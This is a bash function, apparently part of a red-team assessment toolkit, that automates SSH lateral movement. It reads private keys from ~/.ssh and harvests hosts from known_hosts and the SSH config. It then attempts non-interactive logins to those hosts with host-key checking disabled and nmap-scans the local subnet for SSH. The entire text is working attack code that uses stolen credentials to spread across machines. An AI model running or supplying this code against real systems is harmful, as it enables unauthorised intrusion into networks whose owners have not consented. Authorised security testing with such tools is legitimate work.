rt_734_ssh_lateral_movement() {
    rt_banner "RT-734" "SSH Key-Based Lateral Movement"
    local SSH_KEYS=("$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "$HOME/.ssh/id_dsa")
    local KNOWN_HOSTS="$HOME/.ssh/known_hosts"
    local MOVED=0
    
    # Find SSH private keys
    for key in "${SSH_KEYS[@]}"; do
        if [[ -f "$key" ]] && [[ -r "$key" ]]; then
            echo -e "    $RED[CRITICAL] SSH private key found: $key$NC"
            # Extract hosts from known_hosts
            if [[ -f "$KNOWN_HOSTS" ]]; then
                local HOSTS
                HOSTS=$(awk '{print $1}' "$KNOWN_HOSTS" 2>/dev/null | sed 's/\[//;s/\]:.*//' | sort -u | head -10)
                echo -e "    $CYAN[*] Known hosts from known_hosts:$NC"
                echo "$HOSTS" | while read -r h; do
                    if [[ -n "$h" ]]; then
                        # Real: test SSH connection with this key
                        ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
                            -i "$key" "$h" 'echo "[+] SSH LATERAL SUCCESS on $(hostname)"' 2>/dev/null && \
                            echo -e "        $RED[+] LATERAL SUCCESS: $h$NC" && \
                            add_vuln "RT-734" "CRITICAL" "SSH Lateral Movement" "SSH lateral movement to $h via $key" "lateral" "full" "MITRE T1021.004"
                        MOVED=1
                    fi
                done
            fi
        fi
    done
    
    # Check for SSH config with jump hosts
    if [[ -f "$HOME/.ssh/config" ]]; then
        local JUMP_HOSTS
        JUMP_HOSTS=$(grep -iE 'HostName|ProxyJump|Host ' "$HOME/.ssh/config" 2>/dev/null | grep -v '^#' | head -10)
        if [[ -n "$JUMP_HOSTS" ]]; then
            echo -e "    $RED[+] SSH config with jump hosts:$NC"
            echo "$JUMP_HOSTS" | while read -r line; do echo -e "        $RED$line$NC"; done
            add_vuln "RT-734" "HIGH" "SSH Jump Hosts" "SSH config reveals jump hosts for lateral movement" "lateral" "full" "MITRE T1021.004"
        fi
    fi
    
    # Scan local network for SSH
    local LOCAL_IP
    LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    local SUBNET
    SUBNET=$(echo "$LOCAL_IP" | sed 's/\.[0-9]*$/.0\/24/')
    if command -v nmap &>/dev/null; then
        echo -e "    $CYAN[*] Scanning $SUBNET for SSH...$NC"
        local SSH_HOSTS
        SSH_HOSTS=$(nmap -p22 --open "$SUBNET" -T4 -n --max-retries 1 --max-rtt-timeout 500ms 2>/dev/null | grep 'Nmap scan report' | awk '{print $NF}')
        if [[ -n "$SSH_HOSTS" ]]; then
            echo -e "    $RED[+] SSH hosts found on local network:$NC"
            echo "$SSH_HOSTS" | head -5 | while read -r h; do
                echo -e "        $RED$h:22$NC"
                add_vuln "RT-734" "CRITICAL" "Local SSH Target" "SSH target found: $h:22" "lateral" "full" "MITRE T1021.004"
            done
            MOVED=1
        fi
    fi
    
    if [[ "$MOVED" == "0" ]]; then
        echo -e "    $YELLOW[-] No successful lateral movement via SSH$NC"
    fi
}

